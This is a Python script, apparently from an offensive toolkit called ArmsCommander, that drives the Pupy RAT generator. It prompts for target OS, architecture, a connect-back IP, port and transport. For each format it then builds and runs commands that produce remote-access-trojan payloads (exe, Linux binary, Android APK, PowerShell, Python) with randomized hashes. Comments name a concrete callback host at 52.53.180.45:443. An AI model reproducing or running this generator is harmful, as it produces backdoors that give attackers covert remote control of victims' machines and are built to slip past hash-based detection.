#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

    # python pupygen.py -f exe_x86 connect --host 52.53.180.45:443
	# - exe_86, exe_x64  : generate PE exe for windows
# root@Cylon-Basestar:~/pupy/pupy# python /root/pupy/pupy/pupygen.py -f client -O windows -A x86 connect --host 52.53.180.45:443 -t ssl

# CRITICAL UPDATE 4/17
# NinjaSec changed his output formats accoridng to It doesn't work because of cffi_backend. I add linux one to ignore list and forget about windows pyd =
# https://github.com/n1nj4sec/pupy/commit/1fa9343210a16fea90f093f7a1439675715add73
# The new APril 17th format is:
#                   [-f {client, # so basically client = numbers one to eight
#                   py,pyinst,
#                   py_oneliner,
#                   ps1,
#                   ps1_oneliner,
#                   rubber_ducky}]

format_Dict = {
    # '1': 'exe_x86',
    # '2': 'exe_x64',
    # '3': 'dll_x86',
    # '4': 'dll_x64',
    # '5': 'lin_x86',
    # '6': 'lin_x64',
    # '7': 'so_x86',
    # '8': 'so_x64',
    '1': 'client',
    '2': 'py',
    '3': 'pyinst',
    # '4': 'py_oneliner', # We have to cancel/comment these out because they require a active connection to send a payload
    '5': 'ps1',
    # '6': 'ps1_oneliner',
    # '7': 'rubber_ducky',
    '8': 'apk'
}

# New syntax format Pupy Generator is...
# python pupygen.py -f client -O windows --randomize-hash connect --host 52.53.180.45:443

format_List = [
    '\n\t1 Client',
    '2 Standalone Python *.py format',
    '3 Python pyinstaller wrapper file',
    '4 One-Liner HTTP Download-to-Memory Payload',
    '5 ps1 Powershell script, injects a pupy dll into a current process',
    '6 ps1 Remote Download Powershell-to-Pupy script',
    '7 Rubber Ducky Script and Injection binary file',
    '8 Generate a Android-Compatible Pupy APK installer'
]
#

transport_Dict = {
    '1': 'obfs3',
    '2': 'udp',
    '3': 'http',
    '4': 'tcp_cleartext',
    '5': 'rsa',
    '6': 'ssl',
    '7': 'udp_cleartext',
    '8': 'scramblesuit',
    '9': 'ssl_rsa'
}
transport_List = [
    '\n\t1 obfs3',
    '2 udp',
    '3 http',
    '4 tcp_cleartext',
    '5 rsa',
    '6 ssl',
    '7 udp_cleartext',
    '8 scramblesuit',
    '9 ssl_rsa'
]

# New syntax format Pupy Generator is...
# root@Cylon-Basestar:~/pupy/pupy# python pupygen.py -f client -O windows -A x86 --randomize-hash connect --host 52.53.180.45:443

OS_Dict = {
    '1': 'windows',
    '2': 'linux',
    '3': 'android'
}

OS_List = [
    '\n\t#1. Windows Compatible Payload',
    '#2. Linux',
    '#3. Android'
]

Arch_Dict = {
    '1': 'x86',
    '2': 'x64'
}

Arch_List = [
    '\n\t#1. 32-bit',
    '#2. 64-bit'
]

# # Ask user for type of payload
# print ("\n\t".join(format_List))
# payload_Type = str(raw_input("Enter a NUMBER for payload type: "))
# payload_Selected = format_Dict[payload_Type]

# replace top with automatically generating a copy of each payload type

# Ask user for the type of OS they are targeting
print ("\n\t".join(OS_List))
OS_Type = str(raw_input("Enter a NUMBER for OPERATING SYSTEM: "))
OS_Selected = OS_Dict[OS_Type]

print ("\n\t".join(Arch_List))
Arch_Type = str(raw_input("Enter a NUMBER for ARCHITECTURE: "))
Arch_Selected = Arch_Dict[Arch_Type]

host_Connectback = str(raw_input("Enter the IP address where the RAT will connect back to: "))

host_Port = str(raw_input("Enter the PORT of the IP address to connect back to: "))

print ("\n\t".join(transport_List))
host_Transport = str(raw_input("Enter the TRANSPORT (PROTOCOL)"))

for key in format_Dict:
    payload_Selected = format_Dict[key]
# root@Cylon-Basestar:~/pupy/pupy# python pupygen.py -f client -O windows -A x86 --randomize-hash connect --host 52.53.180.45:443
# change the format, its supposed to be after ARCHITECTURE

# I know there is a shorter way to write this, all we are doing is changing the value of a variable before continue to the rest of the cmd StringIO
    if format_Dict[key] == 'client':
        if OS_Selected == 'windows':
            file_extension = 'exe'
        if OS_Selected == "linux":
            file_extension = 'lin'
        if OS_Selected == "android":
            file_extension = 'apk'
    if format_Dict[key] == 'py':
        file_extension = 'py'
    if format_Dict[key] == 'pyinst':
        file_extension = 'py'
    if format_Dict[key] == "ps1":
        file_extension = "ps1"
    if format_Dict[key] == "apk":
        file_extension = "apk"


    cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}.{6} --randomize-hash connect --host {7}:{8}".format(
        payload_Selected,
        OS_Selected,
        Arch_Selected,
        format_Dict[key],
        OS_Selected,
        Arch_Selected,
        file_extension,
        host_Connectback,
        host_Port
    )
    print colored(cmd_String,'red','on_white')
    os.system(cmd_String)

os.system('python /root/ArmsCommander/remoteexploits/Pupy_Menu.py')
